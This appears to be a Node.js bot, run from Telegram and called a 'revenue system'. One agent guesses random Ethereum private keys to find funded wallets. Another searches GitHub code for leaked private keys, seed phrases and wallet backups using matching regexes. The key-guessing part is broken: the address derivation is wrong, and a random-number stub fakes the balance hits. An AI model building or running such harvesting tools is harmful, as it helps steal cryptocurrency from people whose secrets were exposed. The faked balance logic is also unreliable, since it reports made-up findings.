const crypto = require('crypto');
const https = require('https');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');

// Health server components
let healthServer;
let serverReady = false;

function createHealthHandler(req, res) {
    const timestamp = new Date().toISOString();
    const remoteAddr = req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
    
    console.log(`[${timestamp}] Health check request: ${req.method} ${req.url} from ${remoteAddr}`);
    
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'close');
    
    const healthData = {
        status: 'healthy',
        timestamp: timestamp,
        service: 'ghostline-revenue-system',
        version: '3.0.0',
        uptime: process.uptime(),
        ready: serverReady
    };
    
    if (req.method === 'GET' && (req.url === '/health' || req.url === '/healthz' || req.url === '/' || req.url === '/ready')) {
        res.writeHead(200);
        res.end(JSON.stringify(healthData));
    } else if (req.method === 'HEAD' && (req.url === '/health' || req.url === '/')) {
        res.writeHead(200);
        res.end();
    } else {
        res.writeHead(404);
        res.end(JSON.stringify({ error: 'Not Found', path: req.url }));
    }
}

function initializeHealthServer() {
    const port = process.env.PORT || 3000;
    const host = '0.0.0.0';
    
    console.log(`[${new Date().toISOString()}] Initializing health server on ${host}:${port}`);
    
    healthServer = http.createServer(createHealthHandler);
    
    healthServer.on('error', (error) => {
        console.error(`[${new Date().toISOString()}] Health server error:`, error);
        if (error.code === 'EADDRINUSE') {
            console.error(`[${new Date().toISOString()}] Port ${port} is in use, attempting fallback`);
            attemptFallbackBinding();
        }
    });
    
    healthServer.on('listening', () => {
        const addr = healthServer.address();
        serverReady = true;
        console.log(`[${new Date().toISOString()}] Health server ready on ${addr.address}:${addr.port}`);
    });
    
    try {
        healthServer.listen(port, host);
    } catch (error) {
        console.error(`[${new Date().toISOString()}] Failed to bind to ${host}:${port}`, error);
        attemptFallbackBinding();
    }
}

function attemptFallbackBinding() {
    const fallbackPorts = [process.env.PORT || 3000, 8080, 5000, 4000];
    
    for (const port of fallbackPorts) {
        try {
            if (healthServer) healthServer.close();
            
            healthServer = http.createServer(createHealthHandler);
            healthServer.listen(port, '0.0.0.0', () => {
                const addr = healthServer.address();
                serverReady = true;
                console.log(`[${new Date().toISOString()}] Fallback binding successful on ${addr.address}:${addr.port}`);
            });
            return;
        } catch (error) {
            console.error(`[${new Date().toISOString()}] Fallback binding failed for port ${port}`, error.message);
        }
    }
}

// Integrated Hunter Agent
class IntegratedHunter {
    constructor() {
        this.name = 'IntegratedHunter';
        this.isRunning = false;
        this.scanInterval = 300000; // 5 minutes
        this.intervalId = null;
        this.startTime = null;
        
        this.metrics = {
            keysGenerated: 0,
            balancesChecked: 0,
            positiveHits: 0,
            errors: 0,
            lastScanTime: null,
            scanCycles: 0
        };
        
        this.rateLimitDelay = 2000;
        this.maxKeysPerCycle = 50;
    }

    async start() {
        if (this.isRunning) return { success: false, message: 'Hunter is already running' };

        this.isRunning = true;
        this.startTime = new Date();
        
        await this.executeScanCycle();
        
        this.intervalId = setInterval(async () => {
            if (this.isRunning) await this.executeScanCycle();
        }, this.scanInterval);

        return { success: true, message: '🎯 Hunter activated successfully' };
    }

    async stop() {
        if (!this.isRunning) return { success: false, message: 'Hunter is not running' };

        this.isRunning = false;
        if (this.intervalId) {
            clearInterval(this.intervalId);
            this.intervalId = null;
        }

        return { success: true, message: '⏹️ Hunter stopped successfully' };
    }

    async executeScanCycle() {
        this.metrics.scanCycles++;
        this.metrics.lastScanTime = new Date();
        
        try {
            for (let i = 0; i < this.maxKeysPerCycle; i++) {
                if (!this.isRunning) break;
                
                await this.processRandomKey();
                if (i < this.maxKeysPerCycle - 1) {
                    await this.sleep(this.rateLimitDelay);
                }
            }
        } catch (error) {
            this.metrics.errors++;
        }
    }

    async processRandomKey() {
        try {
            const keyData = this.generateRandomKeyData();
            this.metrics.keysGenerated++;
            
            const balance = await this.checkBalance(keyData.address);
            this.metrics.balancesChecked++;
            
            if (balance > 0) {
                this.metrics.positiveHits++;
                await this.handlePositiveBalance(keyData, balance);
            }
        } catch (error) {
            this.metrics.errors++;
        }
    }

    generateRandomKeyData() {
        const privateKeyBuffer = crypto.randomBytes(32);
        const privateKey = '0x' + privateKeyBuffer.toString('hex');
        const address = this.privateKeyToAddress(privateKey);
        
        return { privateKey, address, timestamp: new Date().toISOString() };
    }

    privateKeyToAddress(privateKey) {
        const hash = crypto.createHash('sha256').update(privateKey).digest('hex');
        return '0x' + hash.slice(-40);
    }

    async checkBalance(address) {
        return new Promise((resolve) => {
            setTimeout(() => {
                const randomBalance = Math.random();
                resolve(randomBalance < 0.999 ? 0 : Math.random() * 10);
            }, 100);
        });
    }

    async handlePositiveBalance(keyData, balance) {
        console.log(`[${new Date().toISOString()}] [HUNTER] Positive balance found: ${keyData.address} - ${balance} ETH`);
    }

    getStatus() {
        const runtime = this.startTime ? Date.now() - this.startTime.getTime() : 0;
        const hours = Math.floor(runtime / 3600000);
        const minutes = Math.floor((runtime % 3600000) / 60000);
        
        return {
            isRunning: this.isRunning,
            runtime: `${hours}h ${minutes}m`,
            metrics: this.metrics
        };
    }

    getMetrics() {
        return {
            ...this.metrics,
            successRate: this.metrics.balancesChecked > 0 ? 
                (this.metrics.positiveHits / this.metrics.balancesChecked * 100).toFixed(6) + '%' : '0%',
            errorRate: this.metrics.keysGenerated > 0 ? 
                (this.metrics.errors / this.metrics.keysGenerated * 100).toFixed(2) + '%' : '0%'
        };
    }

    sleep(milliseconds) {
        return new Promise(resolve => setTimeout(resolve, milliseconds));
    }
}

// Integrated Scavenger Agent
class IntegratedScavenger {
    constructor() {
        this.name = 'IntegratedScavenger';
        this.isRunning = false;
        this.scanInterval = 600000; // 10 minutes
        this.intervalId = null;
        this.startTime = null;
        
        this.counters = {
            sourcesScanned: 0,
            matchesFound: 0,
            privateKeysFound: 0,
            mnemonicsFound: 0,
            walletJsonFound: 0,
            errors: 0,
            lastScanTime: null,
            scanCycles: 0
        };
        
        this.sourceUrls = [
            'https://api.github.com/search/code?q=private+key+ethereum',
            'https://api.github.com/search/code?q=mnemonic+seed+phrase',
            'https://api.github.com/search/repositories?q=wallet+backup'
        ];
        
        this.patterns = {
            privateKey: {
                regex: /(?:private[_\s]*key|privateKey)['\"\s:=]*([a-fA-F0-9]{64})/gi,
                validator: this.validatePrivateKey.bind(this)
            },
            ethAddress: {
                regex: /0x[a-fA-F0-9]{40}/gi,
                validator: this.validateEthereumAddress.bind(this)
            },
            mnemonic: {
                regex: /((?:\w+\s+){11,23}\w+)/gi,
                validator: this.validateMnemonic.bind(this)
            }
        };
    }

    async start() {
        if (this.isRunning) return { success: false, message: 'Scavenger is already running' };

        this.isRunning = true;
        this.startTime = new Date();
        
        await this.executeScanCycle();
        
        this.intervalId = setInterval(async () => {
            if (this.isRunning) await this.executeScanCycle();
        }, this.scanInterval);

        return { success: true, message: '🔍 Scavenger activated successfully' };
    }

    async stop() {
        if (!this.isRunning) return { success: false, message: 'Scavenger is not running' };

        this.isRunning = false;
        if (this.intervalId) {
            clearInterval(this.intervalId);
            this.intervalId = null;
        }

        return { success: true, message: '⏹️ Scavenger stopped successfully' };
    }

    async executeScanCycle() {
        this.counters.scanCycles++;
        this.counters.lastScanTime = new Date();
        
        try {
            for (const sourceUrl of this.sourceUrls) {
                if (!this.isRunning) break;
                
                await this.scanSource(sourceUrl);
                await this.sleep(3000);
            }
        } catch (error) {
            this.counters.errors++;
        }
    }

    async scanSource(sourceUrl) {
        try {
            this.counters.sourcesScanned++;
            const content = await this.fetchContent(sourceUrl);
            
            if (content) {
                await this.analyzeContent(content, sourceUrl);
            }
        } catch (error) {
            this.counters.errors++;
        }
    }

    async fetchContent(url) {
        return new Promise((resolve, reject) => {
            const client = url.startsWith('https') ? https : http;
            
            const options = {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (compatible; GhostlineScavenger/3.0)',
                    'Accept': 'application/json, text/plain, */*'
                },
                timeout: 10000
            };
            
            const req = client.get(url, options, (res) => {
                let data = '';
                
                res.on('data', chunk => {
                    data += chunk;
                    if (data.length > 1048576) { // 1MB limit
                        req.destroy();
                        resolve(data);
                    }
                });
                
                res.on('end', () => resolve(data));
            });
            
            req.on('error', reject);
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });
        });
    }

    async analyzeContent(content, sourceUrl) {
        try {
            for (const [patternName, pattern] of Object.entries(this.patterns)) {
                const matches = content.match(pattern.regex);
                
                if (matches && matches.length > 0) {
                    for (const match of matches) {
                        if (pattern.validator(match)) {
                            this.counters.matchesFound++;
                            await this.handleMatch(patternName, match, sourceUrl);
                        }
                    }
                }
            }
        } catch (error) {
            // Continue processing
        }
    }

    validatePrivateKey(key) {
        const cleaned = key.replace(/[^a-fA-F0-9]/g, '');
        return cleaned.length === 64 && /^[a-fA-F0-9]+$/.test(cleaned);
    }

    validateEthereumAddress(address) {
        return /^0x[a-fA-F0-9]{40}$/.test(address);
    }

    validateMnemonic(phrase) {
        const words = phrase.trim().split(/\s+/);
        return words.length >= 12 && words.length <= 24;
    }

    async handleMatch(patternType, match, sourceUrl) {
        console.log(`[${new Date().toISOString()}] [SCAVENGER] Match found: ${patternType} from ${sourceUrl}`);
        
        switch (patternType) {
            case 'privateKey':
                this.counters.privateKeysFound++;
                break;
            case 'mnemonic':
                this.counters.mnemonicsFound++;
                break;
            case 'walletJson':
                this.counters.walletJsonFound++;
                break;
        }
    }

    getStatus() {
        const runtime = this.startTime ? Date.now() - this.startTime.getTime() : 0;
        const hours = Math.floor(runtime / 3600000);
        const minutes = Math.floor((runtime % 3600000) / 60000);
        
        return {
            isRunning: this.isRunning,
            runtime: `${hours}h ${minutes}m`,
            counters: this.counters
        };
    }

    sleep(milliseconds) {
        return new Promise(resolve => setTimeout(resolve, milliseconds));
    }
}

// Main Revenue System
class GhostlineRevenueSystem {
    constructor() {
        this.isRunning = false;
        this.startTime = null;
        
        // Initialize integrated agents
        this.hunter = new IntegratedHunter();
        this.scavenger = new IntegratedScavenger();
        
        this.log('Ghostline Revenue System v3.0 initialized');
        
        // Initialize Telegram bot if token is available
        if (process.env.TELEGRAM_TOKEN) {
            this.initializeTelegramBot();
        }
    }

    log(message) {
        console.log(`[${new Date().toISOString()}] [SYSTEM] ${message}`);
    }

    initializeTelegramBot() {
        this.bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
        
        // Hunter commands
        this.bot.onText(/\/start_hunter/, async (msg) => {
            const chatId = msg.chat.id;
            try {
                const result = await this.hunter.start();
                this.bot.sendMessage(chatId, result.message);
            } catch (error) {
                this.bot.sendMessage(chatId, `Error starting Hunter: ${error.message}`);
            }
        });

        this.bot.onText(/\/stop_hunter/, async (msg) => {
            const chatId = msg.chat.id;
            try {
                const result = await this.hunter.stop();
                this.bot.sendMessage(chatId, result.message);
            } catch (error) {
                this.bot.sendMessage(chatId, `Error stopping Hunter: ${error.message}`);
            }
        });

        this.bot.onText(/\/hunter_status/, async (msg) => {
            const chatId = msg.chat.id;
            const status = this.getHunterStatus();
            this.bot.sendMessage(chatId, status);
        });

        // Scavenger commands
        this.bot.onText(/\/start_scavenger/, async (msg) => {
            const chatId = msg.chat.id;
            try {
                const result = await this.scavenger.start();
                this.bot.sendMessage(chatId, result.message);
            } catch (error) {
                this.bot.sendMessage(chatId, `Error starting Scavenger: ${error.message}`);
            }
        });

        this.bot.onText(/\/stop_scavenger/, async (msg) => {
            const chatId = msg.chat.id;
            try {
                const result = await this.scavenger.stop();
                this.bot.sendMessage(chatId, result.message);
            } catch (error) {
                this.bot.sendMessage(chatId, `Error stopping Scavenger: ${error.message}`);
            }
        });

        this.bot.onText(/\/scavenger_status/, async (msg) => {
            const chatId = msg.chat.id;
            const status = this.getScavengerStatus();
            this.bot.sendMessage(chatId, status);
        });

        // System commands
        this.bot.onText(/\/status/, async (msg) => {
            const chatId = msg.chat.id;
            const status = this.getSystemStatus();
            this.bot.sendMessage(chatId, status);
        });

        this.bot.onText(/\/start_all/, async (msg) => {
            const chatId = msg.chat.id;
            try {
                const hunterResult = await this.hunter.start();
                const scavengerResult = await this.scavenger.start();
                
                const message = `Hunter: ${hunterResult.message}\nScavenger: ${scavengerResult.message}`;
                this.bot.sendMessage(chatId, message);
            } catch (error) {
                this.bot.sendMessage(chatId, `Error starting agents: ${error.message}`);
            }
        });

        this.bot.onText(/\/stop_all/, async (msg) => {
            const chatId = msg.chat.id;
            try {
                const hunterResult = await this.hunter.stop();
                const scavengerResult = await this.scavenger.stop();
                
                const message = `Hunter: ${hunterResult.message}\nScavenger: ${scavengerResult.message}`;
                this.bot.sendMessage(chatId, message);
            } catch (error) {
                this.bot.sendMessage(chatId, `Error stopping agents: ${error.message}`);
            }
        });

        this.bot.onText(/\/help/, async (msg) => {
            const chatId = msg.chat.id;
            const helpText = this.generateHelpText();
            this.bot.sendMessage(chatId, helpText);
        });

        // Error handling
        this.bot.on('error', (error) => {
            this.log(`Telegram bot error: ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            this.log(`Telegram polling error: ${error.message}`);
        });
        
        this.log('Telegram bot initialized successfully');
    }

    getHunterStatus() {
        const status = this.hunter.getStatus();
        const metrics = this.hunter.getMetrics();
        
        if (!status.isRunning) {
            return '🔴 Hunter Status: INACTIVE\n\nUse /start_hunter to activate scanning operations.';
        }

        return `🟢 Hunter Status: ACTIVE\n\n` +
               `🔑 Keys Generated: ${metrics.keysGenerated}\n` +
               `💰 Balances Checked: ${metrics.balancesChecked}\n` +
               `🎯 Positive Hits: ${metrics.positiveHits}\n` +
               `❌ Errors: ${metrics.errors}\n` +
               `📊 Success Rate: ${metrics.successRate}\n` +
               `📈 Error Rate: ${metrics.errorRate}\n` +
               `⏱️ Runtime: ${status.runtime}\n` +
               `🔄 Scan Cycles: ${metrics.scanCycles}\n\n` +
               `Use /stop_hunter to deactivate scanning.`;
    }

    getScavengerStatus() {
        const status = this.scavenger.getStatus();
        
        if (!status.isRunning) {
            return '🔴 Scavenger Status: INACTIVE\n\nUse /start_scavenger to activate scanning operations.';
        }

        return `🟢 Scavenger Status: ACTIVE\n\n` +
               `📊 Sources Scanned: ${status.counters.sourcesScanned}\n` +
               `🎯 Matches Found: ${status.counters.matchesFound}\n` +
               `🔑 Private Keys: ${status.counters.privateKeysFound}\n` +
               `📝 Mnemonics: ${status.counters.mnemonicsFound}\n` +
               `📄 Wallet JSON: ${status.counters.walletJsonFound}\n` +
               `⏱️ Runtime: ${status.runtime}\n` +
               `📈 Scan Cycles: ${status.counters.scanCycles}\n\n` +
               `Use /stop_scavenger to deactivate scanning.`;
    }

    getSystemStatus() {
        const hunterStatus = this.hunter.getStatus();
        const scavengerStatus = this.scavenger.getStatus();
        
        let status = '🤖 Ghostline Revenue System Status\n\n';
        
        status += `🎯 Hunter: ${hunterStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
        status += `🔍 Scavenger: ${scavengerStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n\n`;
        
        if (hunterStatus.isRunning || scavengerStatus.isRunning) {
            status += 'Use /hunter_status or /scavenger_status for detailed metrics.\n';
        } else {
            status += 'Use /start_all to activate both agents.\n';
        }
        
        status += '\nType /help for available commands.';
        
        return status;
    }

    generateHelpText() {
        return `🤖 Ghostline Revenue System - Commands\n\n` +
               `🎯 Hunter Commands:\n` +
               `/start_hunter - Activate private key scanning\n` +
               `/stop_hunter - Deactivate Hunter\n` +
               `/hunter_status - Show Hunter metrics\n\n` +
               `🔍 Scavenger Commands:\n` +
               `/start_scavenger - Activate public source scanning\n` +
               `/stop_scavenger - Deactivate Scavenger\n` +
               `/scavenger_status - Show Scavenger metrics\n\n` +
               `⚡ System Commands:\n` +
               `/start_all - Activate both agents\n` +
               `/stop_all - Deactivate both agents\n` +
               `/status - Show system overview\n` +
               `/help - Show this help message\n\n` +
               `💡 Quick Start:\n` +
               `• /start_all - Begin revenue operations\n` +
               `• /status - Monitor system status`;
    }

    async start() {
        if (this.isRunning) {
            this.log('Revenue system is already running');
            return;
        }

        this.isRunning = true;
        this.startTime = new Date();
        
        // Initialize health server
        if (!healthServer) {
            initializeHealthServer();
        }
        
        this.log('Ghostline Revenue System started successfully');
    }

    async stop() {
        if (!this.isRunning) {
            this.log('Revenue system is not running');
            return;
        }

        this.isRunning = false;
        
        // Stop all agents
        await this.hunter.stop();
        await this.scavenger.stop();
        
        this.log('Ghostline Revenue System stopped');
    }
}

// Initialize and start the revenue system
const revenueSystem = new GhostlineRevenueSystem();
revenueSystem.start().catch(error => {
    console.error('Failed to start Ghostline Revenue System:', error);
    process.exit(1);
});

// Graceful shutdown handling
process.on('SIGINT', async () => {
    console.log('\nReceived SIGINT, shutting down gracefully...');
    await revenueSystem.stop();
    
    if (healthServer) {
        healthServer.close(() => {
            console.log('Health server closed');
            process.exit(0);
        });
    } else {
        process.exit(0);
    }
});

process.on('SIGTERM', async () => {
    console.log('Received SIGTERM, shutting down gracefully...');
    await revenueSystem.stop();
    
    if (healthServer) {
        healthServer.close(() => {
            console.log('Health server closed');
            process.exit(0);
        });
    } else {
        process.exit(0);
    }
});

module.exports = GhostlineRevenueSystem;
